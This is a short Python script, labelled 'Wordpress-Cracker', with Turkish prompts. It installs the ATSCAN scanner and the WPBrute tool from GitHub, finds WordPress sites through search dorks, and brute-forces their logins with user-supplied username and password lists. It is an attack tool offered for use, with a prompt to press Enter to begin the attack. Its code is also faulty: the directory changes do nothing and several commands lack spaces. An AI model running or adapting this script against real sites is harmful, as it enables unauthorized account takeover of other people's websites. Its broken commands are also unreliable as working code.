import os
import webbrowser
print("""

Wordpress-Cracker coded by Arda6

""")
webbrowser.open("https://github.com/arda6" , new = True)
os.system("sudo apt-get install figlet")
os.system("mkdir Bl4P-THT-Wp-Cracker")
os.system("cd Bl4P-THT-Wp-Cracker")
os.system("git clone https://github.com/AlisamTechnology/ATSCAN.git")
os.system("cd ATSCAN")
os.system("chmod +x./install.sh")
os.system("./install.sh")
os.system("cd")
os.system("git clone https://github.com/BlackXploits/WPBrute.git")
os.system("cd WPBrute")
os.system("pip3 install -r requirements.txt")
os.system("clear")
print("Finished...")
attack = str(input("Saldırıya Başlamak İçin Enter a Basın "))
print("-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-")
os.system("cd..")
os.system("cd ATSCAN")
dork = str(input("Dork Dosya Konumu Girin :"))
kayit = str(input("Kayıt Konumunu Girin :"))
username = str(input("Username Listesi Konumu Girin :"))
pas = str(input("Pass Listesi Konumu Girin"))
os.system("perl atscan.pl -d" + dork + "--wp -s" + kayit +"")
os.system("cd..")
os.system("cd WPBrute")
os.system("python wpbrute.py -s " + kayit + "-u" + username + "-w" + pas + "--timeout 500")


